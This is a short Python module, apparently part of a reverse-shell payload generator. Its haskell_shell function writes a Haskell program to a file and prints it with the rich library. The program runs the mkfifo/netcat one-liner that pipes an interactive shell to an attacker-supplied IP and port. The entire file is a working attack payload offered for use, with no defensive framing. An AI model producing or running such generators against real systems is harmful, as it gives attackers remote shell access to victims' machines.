from rich.console import Console
from rich.syntax import Syntax
from rich.style import Style
import time

console = Console()

def haskell_shell(ip, port):
    payload = """module Main where

import System.Process

main = callCommand "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | sh -i 2>&1 | nc %s %d >/tmp/f\"""" % (ip, port)
    with open("reverse-shell.haskell", "w") as f, console.status("[#aed06d]Loading Reverse Shell...[/#aed06d]", spinner="flip"):
        time.sleep(3)
        f.write(payload)
    myStyle = Style(color="#7780ff", bold=True)
    console.print("The payload is: \n", style=myStyle)
    synt = Syntax(payload,"c",theme='dracula', line_numbers=True)
    console.print(synt)
    console.print("\n[#aed06d]Saved as reverse-shell.haskell\n[/#aed06d]", style=myStyle)